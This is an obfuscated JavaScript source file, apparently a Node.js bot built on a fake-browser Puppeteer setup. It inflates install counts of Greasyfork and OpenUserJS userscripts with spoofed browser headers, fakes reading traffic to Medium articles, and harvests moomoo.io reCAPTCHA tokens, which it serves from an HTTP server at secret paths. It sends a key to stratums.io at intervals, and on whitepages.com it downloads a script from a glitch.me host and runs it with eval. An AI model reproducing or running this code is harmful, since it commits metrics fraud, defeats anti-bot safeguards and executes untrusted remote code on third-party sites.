      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + Z(0xe) + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': X(0x14, '*XOt') + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': Y(0x6) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + Y(0x16),
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    X(0x9, 'k7TT') + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + Z(0x8) + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x5 * 0x35e + 0x2290 + -0x11ba
  };

function a() {
  const bn = [
    'uth-ft-rik',
    '-agar-io-s',
    'y2XHC3m',
    'WQeZqt7cUCoqWOhdMCkLka',
    'E8oMW4BcUhi',
    'W5nxW7f9',
    'Ahr0Chm6lY9NCG',
    '\x20(KHTML,\x20l',
    'dium.com/@',
    'emkSW5tdLCoPW4RdQbFcOxa',
    'W4HttcevW6W5fCkgWRm',
    '92duH3cqn1',
    'zwfZEwzVCMSUBW',
    'z0tdLmkvz8outmoRW7DS',
    'utobreak-f',
    '680b972f&u',
    'array',
    '8.0.0.0\x20Sa',
    'WRqTAchcLmo/',
    'zg9JDw1LBNq',
    't8oMWPHkgd7dVgf+WO0',
    'ton\x20>\x20yt-t',
    'lJm2',
    'fCkPW4rCW45gl03cR8kA',
    'strictions',
    'lg1PC3rLCIbIzq',
    'Dmkkv00DWRJdUNuwWRG',
    'toString',
    'CMCVzw4VC2nYAq',
    'mSkOWRGLWP9aW7VdVmktWPa'
  ];
  a = function() {
    return bn;
  };
  return a();
}
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x1 * -0x24c1 + -0x198a + 0x3e4b * 0x1)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0xa * -0x2eb + -0x2411 + 0x747), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0x91 * 0x2b + 0x1f * 0x97 + 0x33b * 0x2), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0x2 * 0x3cb + 0x1b8c + -0x46 * 0x49;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x1fb9 + -0x1a3d + 0x39f6; w < getRandomInt(-0x1ae7 + -0x3b3 + 0x1e9b * 0x1, -0xb7 * 0x25 + 0x1 * 0x2567 + -0x9 * 0x137); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x17192 + 0x162f + 0x245c3);
        }
      }();
    }, 0x1 * -0x76d + -0x262b + 0x6c * 0x6d), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      const a0 = b;

      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x177d * 0x1 + -0xc9 * -0x29 + -0x45a * 0x2;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + a0(0x5, 'IZL)')))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x358 * 0x2 + -0xf0f + -0x125 * -0x13, -0x239e + 0x1 * 0x1d6d + 0x147 * 0x5)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0xe110 + -0xad * 0xd6 + 0x1e6de);
    }, -0x6e8 + 0x25dc * -0x1 + 0x2a8 * 0x11), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0x1930 + 0x1b5 * -0x6 + -0x2 * 0x779;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x29 * -0xd6 + -0xbab + -0xae3), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0xdd9 * -0x2 + 0xe6d + 0xd45), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x1a800f + 0x1 * 0x8d587 + -0x3ecc5 * -0x8);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x17 * 0xb0 + 0x71 * 0x2d + -0x3a9);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x3 * 0x359 + -0x5 * 0x597 + 0x12b0);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x32bc + -0x2910 + 0x62b * 0x14);
}
doFlags['doOUJS'] && ((async () => {
  const a3 = b,
    a2 = d;
  async function f() {
    const a1 = c,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x1dd9 + 0x2433 + -0x420b) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x1837 + -0x1 * -0x1e0d + -0x3643));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0xa24 + -0x2545 + 0x2f69, D['indexOf']('\x20'));
        return B ? E['slice'](0x1 * 0x1fc5 + 0x1 * 0xdaf + -0x2d74 * 0x1, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x123 * 0x14 + 0x333 * 0x13 + -0x25 * -0x7),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x928 * -0x4 + -0x7e6 + -0x36 * -0x31),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': a1(0x13),
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + a2(0x18) + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + a3(0x3, 'N4v6') + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + a3(0x17, '^]&K') + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + a2(0x7) + 'ike\x20Gecko)' + '\x20Chrome/10' + a2(0x11) + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0x70 * 0x4f + -0xf54 + 0x31e4; k < 0x5d6 * -0x2 + -0x1060 * 0x2 + 0x2c70; k++)
